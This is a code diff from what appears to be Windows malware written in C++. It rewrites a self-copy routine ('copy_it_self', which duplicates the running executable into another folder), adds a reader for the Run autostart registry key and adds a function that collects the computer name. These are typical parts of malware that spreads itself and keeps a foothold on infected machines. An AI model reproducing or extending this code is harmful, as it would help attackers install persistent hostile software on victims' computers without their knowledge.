@@ -49,29 +49,10 @@ std::string& my_name() {
 bool copy_it_self(const std::string& dir, const std::string& fname) {
     std::streampos size;
     char * memblock;
+    std::string path = dir + "\\" + fname;
 
     if (!fileExists(fname)) {
-        std::ifstream file(my_name(), std::ios::in | std::ios::binary |
-            std::ios::ate);
-        std::ofstream outfile(dir + fname, std::ofstream::binary);
-
-        if (!outfile.is_open())
-            return false;
-
-        if (file.is_open()) {
-            size = file.tellg();
-            memblock = new char[size];
-            file.seekg(0, std::ios::beg);
-            file.read(memblock, size);
-            outfile.write(memblock, size);
-            file.close();
-            outfile.close();
-
-            delete[] memblock;
-        }
-        else {
-            return false;
-        }
+        CopyFile(my_name().c_str(), path.c_str(), FALSE);
     }
 
     return true;
@@ -99,6 +80,17 @@ std::wstring ReadRegValue(HKEY root, std::string key, std::string name)
 
 }
 
+std::string GetRegistry(char* StringName) {
+    DWORD dwType = REG_SZ;
+    HKEY hKey = 0;
+    char value[1024];
+    DWORD value_length = 1024;
+    const char* subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    RegOpenKey(HKEY_LOCAL_MACHINE,subkey,&hKey);
+    RegQueryValueEx(hKey, StringName, NULL, &dwType, (LPBYTE)&value, &value_length);
+    return std::string(value);
+}
+
 int SetKeyData(HKEY hRootKey, char *subKey, DWORD dwType, char *value, LPBYTE data, DWORD cbData)
 {
     HKEY hKey;
@@ -113,6 +105,14 @@ int SetKeyData(HKEY hRootKey, char *subKey, DWORD dwType, char *value, LPBYTE da
 
     RegCloseKey(hKey);
     return 1;
+}
+
+std::string getComputerName() {
+    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
+    if (GetComputerName(buffer, &len))
+        return std::string(buffer, len);
+    return "UNKNOWN";
 }
 
 }
